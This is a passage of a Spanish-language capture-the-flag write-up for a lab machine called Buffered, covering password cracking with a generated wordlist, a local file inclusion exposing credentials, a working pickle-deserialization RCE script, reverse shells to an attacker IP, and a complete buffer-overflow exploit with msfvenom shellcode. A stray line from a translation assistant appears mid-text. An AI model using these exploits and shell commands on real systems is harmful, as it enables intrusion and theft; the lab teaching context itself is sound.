|  4 | christine@buffered.dl | $2y$10$QYb/E/Rby6El2m4yfhfKf.eyX2.fz2zzNI8.xT8ihfwfKFT2WlDya | marketing |
+----+-----------------------+--------------------------------------------------------------+-----------+
4 rows in set (0.09 sec)

mysql> select * from users;
+----+--------------------+-------------------------------------------------------------------------------+-------+
| id | email              | password                                                                      | role  |
+----+--------------------+-------------------------------------------------------------------------------+-------+
|  1 | admin@buffered.dl  | $5$rounds=535000$gdgvlJGiCppSjhjF$qsbyr/0gt1jn6TFVSqBbNuT7V80L8Q1ZO2i/ncboW43 | admin |
|  9 | wilson@buffered.dl | $5$rounds=535000$bd4mhu.kst.nfzLt$WxIaokZfDMCPUV45.FoxJJZskGiEE3EEMLZB6jB5NZ9 | user  |
| 10 | craft@test.com     | $5$rounds=535000$ABXC2SxMZKO2uq2g$B14ZMVvRIYH1aTsNIXb63ekhS1pzMu3IxcbLD8kB68. | user  |
+----+--------------------+-------------------------------------------------------------------------------+-------+
3 rows in set (0.00 sec)
```

Como podemos ver, la tabla normal **users** es del primer sitio web que vimos antes **dashboard.buffered.dl** donde creé mi usuario.

Y la tabla **users_old** es nueva para nosotros.

Después de muchos intentos por romper estas contraseñas, encontré una que se puede romper.

Y ¿cómo?

Tenemos la ventaja de algo, el generador de contraseñas, porque tenemos el nombre y el apellido de **christine** (ross), podríamos crear también un generador de contraseñas que genere todas las contraseñas posibles para este usuario y romperla con **john** pasándole el hash.

Así que voy a hacer un generador de contraseñas con python.

```python
from pwn import *
import signal, os, re

bar = log.progress("Generating...")

def stop(sig=False, frame=False):
    print()
    bar.failure("Proccess stopped.")
    log.warn("QUITTING")
    sys.exit(1)

signal.signal(signal.SIGINT, stop)

def start(user):
    file = f"../files/all_possible_pass_{user}"
    number = 0

    if os.path.exists(file):
        with open(file) as f:
            last = f.readlines()[-1]
            number = re.findall(rf"{user}@buffered_(.*)", last)[0]
            log.info(f"Continuing, last saved password: {last}")

    for num in range(int(number) + 1, 1000000):
        num = f"{num:06d}"

        password = f"{user}@buffered_{num}"

        bar.status(f"Saving the pass: {password}")

        with open(file, "a") as f:
            f.write(f"{password}\n")

    bar.success("All the passwords have been saved.")

if __name__ == "__main__":
    user = str(input("[i] Enter the user (e.g, j.doe): ")).strip()
    if not user: stop()

    start(user)
```

Así que este script de Python que introducimos el usuario y automáticamente genera todas las contraseñas posibles.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 generator.py 
[+] Generating...: All the passwords have been saved.
[i] Enter the user (e.g, j.doe): c.ross
```

Bien, así que tenemos todas las contraseñas posibles, ahora vamos a romper el hash del usuario **christine**, de la tabla **users_old** con **john**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ john --wordlist=all_possible_pass_c.ross hash_christine
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
c.ross@buffered_[REDACTED] (?)     
1g 0:00:00:24 DONE (2026-01-18 14:51) 0.04076g/s 55.76p/s 55.76c/s 55.76C/s c.ross@buffered_001333..c.ross@buffered_001368
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Bien, así que obtuvimos la contraseña del usuario christine.

En particular, se puede usar en el sitio web que está en el puerto 5555.

![Screenshot](/hard/Buffered/Images/image14.png)

Estamos dentro.

Después de mucho tiempo viendo el sitio web y sus múltiples funciones, encontré algo interesante en la página del **dashboard**.

Más específicamente, en la parte de descargar informe.

![Screenshot](/hard/Buffered/Images/image15.png)

Podemos descargar un archivo txt.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ cat logins.txt 
[+] Successful login attempt by user: christine from IP: 127.0.0.1
[+] Successful login attempt by user: christine from IP: 127.0.0.1
[+] Successful login attempt by user: christine from IP: 127.0.0.1
```

Podemos ver esto, pero ¿qué pasa si pudiéramos interceptar esta solicitud?

```r
------WebKitFormBoundaryctmv1DPLDTPUrsfB
Content-Disposition: form-data; name="report"

logins.txt <- /etc/passwd
------WebKitFormBoundaryctmv1DPLDTPUrsfB--
```

Podemos ver esto, ¿qué pasa si reemplazamos ese txt por otro archivo en el sistema?

Por ejemplo **/etc/passwd**

Y podemos ver esto en la respuesta:

```r
ETag: "1722655866.0-1031-393413677"
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
.........
```

Podemos ver otros archivos en el sistema.

Esto es una **LFI (Local File Inclusion)**, podríamos intentar ver si podemos ver archivos potenciales en los usuarios del sistema.

```r
------WebKitFormBoundaryTU62hpeAJCymU6sl
Content-Disposition: form-data; name="report"

/home/christine/.bashrc
------WebKitFormBoundaryTU62hpeAJCymU6sl--
```

En este caso, como el usuario christine.

```r
ETag: "1722357396.0-3771-1711540385"
Connection: close

# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
.........
```

Podemos ver los archivos del usuario **christine**, probablemente este sitio web está siendo ejecutado por este usuario.

Si vemos qué procesos están corriendo en la máquina, podemos ver esto:

```r
wilson@6f65e99ac74a:/tmp$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2808   196 ?        Ss   11:24   0:00 /bin/sh -c service mysql stop && rm -f /var/run/mysqld/mysqld.sock && rm -f /var/run/mysqld/mysqld.sock.lock && service mysql start && service nginx start &&  supervisord 
mysql         62  0.0  0.0   2808   200 ?        S    11:24   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        209  1.4  3.7 2442480 128252 ?      Sl   11:24   2:19 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --pid-file=6f65e99ac74a.pid
root         350  0.0  0.0  11196   104 ?        Ss   11:24   0:00 nginx: master process /usr/sbin/nginx
www-data     351  0.0  0.0  11688  1988 ?        S    11:24   0:00 nginx: worker process
www-data     352  0.0  0.0  11688  2044 ?        S    11:24   0:00 nginx: worker process
www-data     353  0.0  0.0  11688  2032 ?        S    11:24   0:00 nginx: worker process
www-data     354  0.0  0.0  11688  2012 ?        S    11:24   0:00 nginx: worker process
root         355  0.0  0.1  34692  6636 ?        S    11:24   0:03 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
root         356  0.0  0.0   4820   180 ?        S    11:24   0:00 /bin/su - christine -c python /home/christine/.site/APP_3411/app.py
root         357  0.0  0.0   4820   184 ?        S    11:24   0:00 /bin/su - tyler -c /home/tyler/.dev/bufferbot
root         358  0.0  0.0   4820   184 ?        S    11:24   0:00 /bin/su - wilson -c dashboard
tyler        359  0.0  0.0   2828     8 ?        Ss   11:24   0:00 /home/tyler/.dev/bufferbot
wilson       360  0.0  0.6 470212 22444 ?        Ssl  11:24   0:05 /usr/bin/python3 /home/wilson/dashboard/app.py
christi+     361  0.0  0.8 469872 28032 ?        Ss   11:24   0:04 python /home/christine/.site/APP_3411/app.py
wilson       486  0.0  0.0   2808  1760 ?        S    11:41   0:00 /bin/sh -c /bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/1111 0>&1"
wilson       487  0.0  0.0   4760  3292 ?        S    11:41   0:00 /bin/bash -c /bin/bash -i >& /dev/tcp/172.17.0.1/1111 0>&1
wilson       488  0.0  0.1   5024  3856 ?        S    11:41   0:00 /bin/bash -i
wilson       491  0.0  0.2  15260  8648 ?        S    11:42   0:00 /usr/bin/python3 -c import pty; pty.spawn("/bin/bash")
wilson       492  0.0  0.1   5024  4112 pts/0    Ss   11:42   0:00 /bin/bash
wilson       522  0.0  0.2 1235600 7796 pts/0    Sl   12:51   0:00 ./chisel client 172.17.0.1:1234 R:5000:127.0.0.1:5000 R:5555:127.0.0.1:5555 R:9000:127.0.0.1:9000 R:33060:127.0.0.1:33060
wilson       598 16.6  0.1   8340  4272 pts/0    R+   14:09   0:00 ps aux
```

¿Puedes ver el interesante?

Y lo encontramos, que **christine** está ejecutando el siguiente proceso:

```r
christi+     361  0.0  0.8 469872 28032 ?        Ss   11:24   0:04 python /home/christine/.site/APP_3411/app.py
```

Podemos ver el archivo app.py, vamos a intentar ver su contenido con esta LFI.

```r
------WebKitFormBoundaryTU62hpeAJCymU6sl
Content-Disposition: form-data; name="report"

/home/christine/.site/APP_3411/app.py
------WebKitFormBoundaryTU62hpeAJCymU6sl--
```

Y podemos ver esto:

```python
ETag: "1722476856.0-8724-4163832994"
Connection: close

from flask import Flask, send_file, render_template, redirect, url_for, request, session, flash, jsonify, abort
from werkzeug.security import generate_password_hash  # Keep this for password hashing
from passlib.context import CryptContext  # Import CryptContext from passlib
import pickle
import mysql.connector
import base64
import logging
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key' 

pwd_context = CryptContext(schemes=["sha256_crypt"], deprecated="auto")

db_config = {
    'user': 'db_marketing_manager',
    'password': 'usyaw4Onn+',
    'host': 'localhost',
    'database': 'marketing_site',
    'use_pure': True,
    'auth_plugin': 'mysql_native_password',
    'ssl_disabled': True,
}

.........
```

Podemos ver todo el script de Python, incluso las credenciales de la base de datos, parece que está en el puerto 33060 que descubrimos antes.

Pero no es así, en este script podemos ver que se está importando una librería muy peligrosa, que es pickle.

Con esta librería, pickle es peligrosa, ¿y por qué?

Porque puede llevar a una RCE.

Es un poco difícil de explicar, necesitamos hablar de cómo Python realmente funciona con objetos serializados, un poco de bajo nivel y todo eso.

Si quieres saber más sobre todo esto y por qué pickle es una mala idea de usar, puedes echar un vistazo aquí

En resumen, cuando serializamos datos con el formato pickle, estamos trabajando con bytes y, cuando deserializamos, es como recuperar una vez más la información, pero cuando pickle deserializa, está ejecutando byte por byte como cuando pickle lo hace.

Ejemplo:

Claro, te ayudaré a traducir el writeup al español. Aquí está la traducción completa con todo el contenido traducido excepto las partes de código:

---

### Ejemplo:

```python
>>> import pickle
>>> pickle.dumps(["pwned", 1, 2, "yayy!!"])
b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.'
```

Esto es como el formato pickle.

Para deserializarlo necesitamos cargar esa cadena de bytes, y podemos ver que la información se recupera.

```python
>>> pickle.loads(b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.')
['pwned', 1, 2, 'yayy!!']
```

Podemos recuperar la información, y puedes ver por qué esto es vulnerable. Podemos hacer un payload que en lugar de hacer todo esto, podemos intentar importar la librería **os** y ejecutar código arbitrario.

¿Y dónde es vulnerable?

En esta parte del script:

```python
@app.route('/submit_review', methods=['POST'])
def submit_review():
    product_name = request.form.get('product_name')
    review_text = request.form.get('review_text')
    rating = request.form.get('rating')
    mydata = request.form.get('mydata')
    if mydata:
        try:
            mydata_bytes = base64.b64decode(mydata)
            data = pickle.loads(mydata_bytes) # VULNERABLE
            print("Deserialized data:", data)
        except Exception as e:
            print("Deserialization error:", e)
    if save_review(product_name, review_text, rating):
        return jsonify({"status": "success", "message": "Review submitted!"}), 200
    else:
        return jsonify({"status": "error", "message": "Failed to submit review."}), 500
```

En esta parte cuando enviamos una reseña de cualquier producto, se realiza un POST a **/submit_review**

Se envía contenido normal como **product_name, review_text**, etc.

Pero si enviamos el contenido **mydata**, el script decodifica los datos en base64, y después de eso, carga los datos con pickle (RCE).

Así que voy a hacer un diagrama con **excalidraw** para explicar mejor qué hace este script vulnerable:

![Screenshot](/hard/Buffered/Images/image16es.png)

Espero que lo entiendas mejor. Voy a hacer un exploit con python.

Pero antes de hacer el exploit, necesitamos ver cómo se envían los datos cuando enviamos una reseña en el sitio web.

![Screenshot](/hard/Buffered/Images/image17.png)

Podemos ver que se envía en datos WebkitFormBoundary, esto es importante saberlo para enviar correctamente solicitudes al sitio web.

```python
from pwn import *
from requests_toolbelt import MultipartEncoder
import pickle, signal, os, base64, string, random, requests

def stop(sig, frame):
    print()
    log.warn("QUITTING")
    sys.exit(0)

signal.signal(signal.SIGINT, stop)

def send(payload):
    target = "http://localhost:5555/submit_review"

    class RCE:
        def __reduce__(self):
            return (os.system, (payload,))

    format_pickle = pickle.dumps(RCE())
    converted = base64.b64encode(format_pickle)

    fields = {
        "product_name": "yes",
        "review_text": "tunometecabrasarambabiche",
        "rating": "0",
        "mydata": converted
    }

    bound = '----WebKitFormBoundary' + ''.join(random.sample(string.digits + string.ascii_letters, 16))

    final = MultipartEncoder(boundary=bound, fields=fields)

    heads = {
        "Content-Type": final.content_type,
        "Cookie": "session=[REDACTED]"
    }

    response = requests.post(url=target, headers=heads, data=final)

    log.info(f"Payload: {converted}")
    print(response.text)
    log.warn("PAYLOAD EXECUTED")

def start():
    while True:
        cmd = str(input("\n[*] CMD -> ")).strip()

        send(cmd)

if __name__ == "__main__":
    start()
```

Veamos si el exploit funciona.

```r
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 pickle_rce.py 

[*] CMD -> touch /tmp/pwned
[*] Payload: b'gASVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu'
{"message":"Review submitted!","status":"success"}

[!] PAYLOAD EXECUTED
```

Así que creé un archivo **pwned** en **/tmp**.

```r
wilson@6f65e99ac74a:/tmp$ ls -l pwned 
-rw-rw-r-- 1 christine christine 0 Jan 18 15:18 pwned
```

¡Podemos ver que los comandos están siendo ejecutados por **christine**!

Bien, ahora vamos a hacer una reverse shell y estar en modo escucha con **netcat** para recibir la shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
```

Ahora ejecutemos el comando para obtener acceso como **christine**.

```r
┌──(mike)─(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 pickle_rce.py 

[*] CMD -> bash -c 'bash -i >& /dev/tcp/172.17.0.1/2222 0>&1'
```

Y recibimos esto.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 2222
listening on [any] 2222 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 40914
bash: cannot set terminal process group (361): Inappropriate ioctl for device
bash: no job control in this shell
christine@6f65e99ac74a:~$ whoami
whoami
christine
```

Así que vamos a modificar esta shell como hicimos antes, pero en este caso podemos usar script para spawner una bash.

---

# Movimiento Lateral Tyler

Con este usuario como **christine** estamos en un grupo:

```r
christine@6f65e99ac74a:~$ id
uid=1001(christine) gid=1001(christine) groups=1001(christine),1004(ftp)
```

Estamos dentro del grupo **ftp**, podríamos intentar encontrar posibles archivos o directorios con este grupo.

```r
christine@6f65e99ac74a:~$ find / -group ftp 2>/dev/null
/ftp
```

Y podemos ver un directorio, veamos qué tiene.

```r
christine@6f65e99ac74a:~$ cd /ftp
christine@6f65e99ac74a:/ftp$ ls -la
total 24
drwxr-x--- 2 root ftp   4096 Jul 31  2024 .
drwxr-xr-x 1 root root  4096 Jan 18 11:24 ..
-rwxr-xr-x 1 root root 15448 Jul 31  2024 bufferbot
```

Podemos ver este archivo **bufferbot**, y no podemos ejecutarlo...

```r
christine@6f65e99ac74a:/ftp$ ./bufferbot 
bind: Address already in use
```

Así que vamos a transferir este ejecutable nuevamente con un servidor python y descargarlo con wget

```r
christine@6f65e99ac74a:/ftp$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Bien, descargémoslo entonces.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ wget http://172.17.0.2:100/bufferbot
--2026-01-18 16:46:48--  http://172.17.0.2:100/bufferbot
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15448 (15K) [application/octet-stream]
Saving to: ‘bufferbot’

bufferbot                                                   100%[==================================================>]  15.09K  --.-KB/s    in 0s      

2026-01-18 16:46:48 (318 MB/s) - ‘bufferbot’ saved [15448/15448]
```

Veamos un poco de información de este binario con **file**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ file bufferbot 
bufferbot: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=05901d675607336b0810e7f6aa491fab899737c3, for GNU/Linux 3.2.0, not stripped
```

Podemos ver que es un ejecutable binario de 32 bits y no está desprovisto de información, esto es genial porque podemos ver el nombre de las funciones que está utilizando este ejecutable.

Bien, ejecutémoslo entonces:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ chmod +x bufferbot 
                                                                                
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./bufferbot 
bind: Address already in use
```

Parece que tenemos un puerto en uso, porque estamos utilizando chisel y está utilizando un puerto, muy probablemente el puerto 9000, así que podríamos matar el proceso de chisel.

```r
wilson@6f65e99ac74a:/tmp$ ps u | grep chisel | grep -v grep | for i in $(awk '{print $2}'); do kill $i; done
```

Con este comando matamos el proceso de chisel sin necesitar buscar el PID de chisel.

Bien, ahora ejecutemos una vez más el binario con nuestra máquina de ataque.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ./bufferbot 
Server is listening on port 9000
```

Podemos ver que está en modo de escucha en el puerto 9000, conectemos con netcat.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ nc 127.0.0.1 9000
⠀⣁⠒⣠⣌⢓⡙⣿⣿⡁⠨⢉⣐⠢⣸⣿⣿⣿⣿⣾⣿⣷⣾⣿⣯⣿⣿⣿⣿⣇⠂⣂⡋⠥⠊⣿⣿⢏⡞⣫⣄⠐⢀⡀
⣠⣶⣿⣿⣿⠌⠷⠹⣿⡿⡠⢘⣫⣾⣿⣿⣿⡿⢛⣫⣭⡶⠶⣭⣍⡛⢿⣿⣿⣿⣿⣝⡁⢄⢺⣿⠿⠼⠅⣿⣿⣿⣶⣦
⣿⣿⣿⣿⡿⡘⣱⣟⡂⠜⣴⣿⣿⣿⣿⡿⣩⣎⣿⣟⢪⢇⡰⣗⣿⣿⣇⣌⠻⣿⣿⣿⣿⣦⠳⢒⣿⣎⢃⢿⣿⣿⣿⣿
⣿⣿⣿⣿⠣⠰⣾⡶⠉⣼⣿⣿⣿⣿⢏⣾⡿⢿⣿⣮⢘⣆⠱⡂⣵⣿⣿⢿⣷⡙⣿⣿⣿⣿⣧⠫⢶⣷⠆⠜⣿⣿⢿⣿
⢿⣯⣪⣿⡄⢘⣽⣭⡆⣿⣿⣿⣿⡟⣼⣿⣷⢾⠳⠟⣹⢿⡶⣿⠻⠾⣻⣿⣿⣧⢹⣿⣿⣿⣿⢸⣭⣯⡇⢢⣿⣯⢪⣿
⢌⢿⣿⣿⣷⡈⢵⢿⣗⡸⣿⣿⣿⡇⠛⣿⡓⠁⢀⣀⡀⠈⠉⠀⣀⡀⠀⢩⡟⠋⢸⣿⣿⣿⢇⣺⡿⡮⢁⣾⣿⣿⣿⢏
⠹⣆⡛⢿⣿⣿⡄⢋⡏⠷⣈⠻⣿⣷⡀⣿⠇⠀⢾⣿⡿⠀⠀⢸⣿⡿⠀⢸⡀⠀⣼⣿⠟⣁⡺⢩⣝⢠⣾⣿⣿⠟⣁⢮
⣄⠈⠊⣢⡼⡶⣶⣿⣧⣦⡁⢋⠖⡭⢡⠄⠞⠄⣄⠈⠀⠀⠀⠀⠈⣀⡄⠢⠁⡌⢭⡲⡝⠊⣠⣮⣿⣶⡶⡲⣤⡛⠊⠂
⣭⡅⢺⣿⣇⣁⣼⣿⣶⣿⣷⡀⠘⠀⢥⣄⠀⠀⠋⠀⢿⠀⠀⢾⠀⠸⠁⠀⡀⣘⡁⠁⢀⣾⣿⣷⣿⣿⣌⣁⣿⣿⠃⣬
⢛⣡⣟⣿⣿⣏⣎⣿⡿⢿⣯⣷⢹⣆⠉⠻⣯⣖⣤⠄⣈⣀⣀⣀⠠⣤⣲⣼⠟⠁⢠⡟⡼⣭⣿⢿⣿⣯⣏⣿⣿⣟⣧⣙
⣿⣻⣿⣿⣻⣟⣷⣿⣿⣷⣶⢸⢸⣿⣿⣆⡄⡉⠛⠻⠿⠹⠏⠽⠛⠛⢉⢠⣰⣶⣿⣇⠇⢶⣾⣿⣿⣿⣿⣿⣻⣿⣿⣻
⢯⣽⣾⡟⣿⣿⣻⠱⣥⢸⠀⢀⣺⣿⢿⣷⣕⣹⣾⣧⣴⣶⣶⣦⣴⣷⣯⣨⢾⣿⣿⣿⡄⠈⠉⢮⡷⡋⣿⣿⣟⢿⣿⣭
⠧⡞⠩⠅⣚⣛⠃⢐⣒⠠⠂⣬⣿⡿⠾⢷⣿⣿⣿⣿⡿⣟⣛⢿⣿⣿⣿⣿⣿⠷⢿⣿⡶⠐⠨⢒⡒⠑⢛⣛⡓⠭⢑⢢
⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠸⣿⣯⢪⣿⡵⣽⣿⣿⣽⡜⣾⣷⢱⢫⣿⣿⡟⡟⣽⣝⡞⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤
⣩⣉⣓⠻⠿⡖⠠⠄⠀⠀⠴⣿⣏⢮⣉⡵⣻⣿⣿⣿⣾⣢⣴⣪⣿⣿⣿⣧⡣⣙⡡⣣⣿⣆⠀⠀⠀⠤⠐⣲⠿⢛⣊⣉
⣛⣛⠺⢿⣶⡤⣀⠀⠀⠀⠈⢿⠟⣿⣶⣯⢿⣟⡻⠿⠭⠭⠭⠭⠿⠟⣻⡿⢵⣷⣿⠻⢻⠃⠀⠀⠀⢀⡠⢴⣾⠿⢒⣛
⡕⡪⢝⢶⡬⡉⠀⠀⠀⠀⠀⢀⡙⠏⠓⠈⣁⣀⣤⣤⣤⣤⣤⣤⣤⣀⣀⣈⠉⠚⠩⢟⡁⠀⢀⠀⠀⠁⠀⡩⣴⢾⡫⣕
        [ B u f f e r b o t ]
hello?

Message received
```

Y podemos ver esto:

![Screenshot](/hard/Buffered/Images/image18.png)

Podemos ver que estamos sobrescribiendo otros registros como **EBP, EIP**...

En particular tenemos interés en el registro **EIP** porque si podemos tener control de este registro podemos llevar el flujo del programa.

Para encontrar el offset de este registro podemos crear patrones, en gef podemos hacer eso.

```r
gef➤  pattern create 2048
[+] Generating a pattern of 2048 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaai.....                                           
[+] Saved as '$_gef0'
```

Copiamos todo este payload al portapapeles y ejecutamos una vez más el programa.

Y cuando hacemos esto podemos ver esto:

![Screenshot](/hard/Buffered/Images/image19.png)

Podemos encontrar que el valor de eip es **aank**, pero por alguna razón gef no puede buscar este patrón, así que necesitamos hacerlo un poco manualmente.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ echo "aaaabaaacaaadaaaeaaaf......" | grep aank
...... aniaanjaankaanlaa ......
```

Así que copiamos todos los caracteres que están antes del patrón encontrado.

Y podemos contar el número de bytes antes de sobrescribir EIP con python.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ python2 -c "print len('aaaabaaacaaadaaaeaaaf......')"
1337
```

Parece que el offset es **1337** podríamos hacer un payload con este número.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ python2 -c 'print "A"*1337 + "B"*4 + "C"*200'
```
Y copiamos el payload y ejecutamos nuevamente el programa para enviar todo este payload.

Y cuando hacemos esto podemos ver esto:

![Screenshot](/hard/Buffered/Images/image20.png)

Sobrescribimos EIP con **BBBB** así que el offset de este registro es 1337

Y todas esas Cs están siendo guardadas en la pila.

Así que podemos hacer nuestro shellcode ahora para obtener una reverse shell en el sistema, con un exploit de python.

Pero antes de hacer eso, necesitamos encontrar la dirección de la **pila**, podemos encontrarla con **ropper**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ ropper --file bufferbot --search 'jmp esp'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp

[INFO] File: bufferbot
0x08049559: jmp esp;
```

Y la dirección es **0x08049559**, ¿por qué hacemos esto?

Porque cuando vamos a inyectar nuestro payload en la pila, y necesitamos saltar a la pila para ejecutar nuestro payload malicioso, recuerda que tenemos EIP y podemos dirigir el flujo del programa.

Y finalmente podemos crear nuestro shellcode malicioso con **msfvenom**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ msfvenom -n 32 -p linux/x86/shell_reverse_tcp lhost=172.17.0.1 lport=3333 -f py -o shellcode.py
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch was selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Successfully added NOP sled of size 32 from x86/single_byte
Payload size: 100 bytes
Final size of py file: 510 bytes
Saved as: shellcode.py
```

Y podemos guardar todo ese payload en **shellcode.py** el shellcode está en el archivo en formato python y es más fácil y rápido importarlo con python. Además, este archivo tiene algunos NOPS antes del shellcode.

¿Por qué NOPS?

Los **NOPS** son básicamente una serie de bytes que son **sin operación**, estos **NOPS** están siendo guardados en la pila, y esos bytes no van a ejecutar inmediatamente el **shellcode**, porque a veces las direcciones en la memoria pueden ser afectadas o ser un poco diferentes en la máquina objetivo.

Con **msfvenom**, los NOPS, en lugar de ser \x90, tendrán un formato más ofuscado; el exploit seguiría funcionando independientemente de si los NOPS están ofuscados o no.

Así que voy a hacer el exploit.

```python
from pwn import *
from shellcode import buf

target = "127.0.0.1"
port = 9000

def exploit():
    offset = 1337

    # 0x08049559: jmp esp;

    esp = p32(0x08049559)

    payload = b"A"*offset + esp + buf

    connect = remote(target, port)
    connect.sendline(payload)
    connect.close()

if __name__ == "__main__":
    exploit()
```

Bien, voy a hacer otro diagrama con **excalidraw** para explicar esto.

![Screenshot](/hard/Buffered/Images/image21es.png)

Bien ahora ejecutemos el Exploit.

Pero necesitamos hacer nuevamente el túnel chisel porque antes apagamos el túnel.

```r
wilson@e28272dae0de:/tmp$ ./chisel client 172.17.0.1:1234 R:9000 &
[1] 485
wilson@e28272dae0de:/tmp$ 2026/01/19 14:04:11 client: Connecting to ws://172.17.0.1:1234
2026/01/19 14:04:11 client: Connected (Latency 970.349µs)
```

Bien ahora hagamos un **netcat** listener para recibir la shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 3333
listening on [any] 3333 ...
```

Genial, ahora ejecutemos el exploit y hagamos un Buffer Overflow y dejemos que el sistema ejecute nuestro shellcode para recibir una shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 bof_shellcode.py 
[+] Opening connection to 127.0.0.1 on port 9000: Done
[*] Closed connection to 127.0.0.1 port 9000
```

Y recibimos esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 44876
whoami
tyler
```

Estamos dentro como **tyler**!

Así que hagamos un tratamiento de la shell nuevamente.

---
# Escalada de Privilegios

En el directorio de inicio del usuario **tyler** podemos ver este binario:

```r
tyler@e28272dae0de:/home/tyler$ ls -l
total 20
-rwsr-xr-x 1 root root 16488 Jul 30  2024 shell
```

Podemos ver que el propietario de este binario es el usuario root.

```d
tyler@e28272dae0de:/home/tyler$ ./shell 
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣤⡾⠻⠫⣦⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⢀⣰⡲⡿⢳⣦⡀⠄⠄⠸⠉⠇⠄⢀⣾⡃⠄⠄⠄⣠⣦⡿⣷⣤⡀⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠸⠯⠁⠄⠈⣗⡃⠄⠄⠠⠒⠄⣠⡺⠎⠁⠄⠄⢘⣳⠃⠄⠈⠭⠷⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠄⠒⢶⠄⢠⣽⢣⣄⠄⠄⢠⣶⠋⢠⡀⠄⠄⢀⣄⢯⣄⠄⠰⠖⠂⠄⠄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⢀⣆⢶⢰⣄⠄⢁⢢⠶⠁⠃⢻⢷⠄⣶⡏⠄⠩⣿⠄⣸⠎⠋⠈⠷⡄⢏⠁⡠⣶⣶⣶⣄⠄⠄⠄⠄
⠄⠄⠄⢶⢏⠤⡀⣼⠄⠁⣼⡏⢰⣦⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠄⣶⢸⣷⠄⠄⣿⠄⡠⢬⡶⠄⠄⠄⠄
⠄⠄⠄⠄⡁⠩⡃⢻⠄⠄⠹⣇⢸⣿⠄⠄⣠⠤⠄⠄⠄⠠⣤⠄⠄⠄⣿⡸⡏⠄⠄⡿⠘⢌⢃⠁⠄⠄⠄⠄
